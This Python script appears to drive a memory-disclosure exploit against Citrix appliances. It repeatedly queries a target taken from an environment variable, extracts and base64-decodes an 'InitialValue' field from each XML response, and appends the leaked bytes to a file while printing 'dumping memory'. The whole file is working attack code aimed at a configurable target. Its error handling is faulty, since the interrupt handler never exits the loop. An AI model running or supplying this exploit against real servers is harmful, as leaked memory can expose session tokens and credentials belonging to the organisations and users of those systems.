import logging 
from src.http_handler import CitrixConnection
from src.request_configuration import *
from dotenv import load_dotenv
import asyncio
import aiohttp
from src.http_handler import CitrixConnection
from bs4 import BeautifulSoup
import base64
import os

load_dotenv()


async def main():
    domain = os.getenv("TARGET_URL")
    async with aiohttp.ClientSession() as session:
        citrix = CitrixConnection(domain, session)
        print('dumping memory')

        with open("output\\output.txt", "ab") as file:
            while True:
                try:
                
                    response_body = await citrix.target()

                    soup = BeautifulSoup(response_body, "lxml-xml")
                    initial_values = soup.find("InitialValue")

                    value = initial_values.text if initial_values else None
                    decoded_bytes = base64.b64decode(value)
                    file.write(decoded_bytes)
                
                except KeyboardInterrupt:
                    print("Keyboard interrupt recieved, terminating program")


if __name__ == "__main__":
    asyncio.run(main())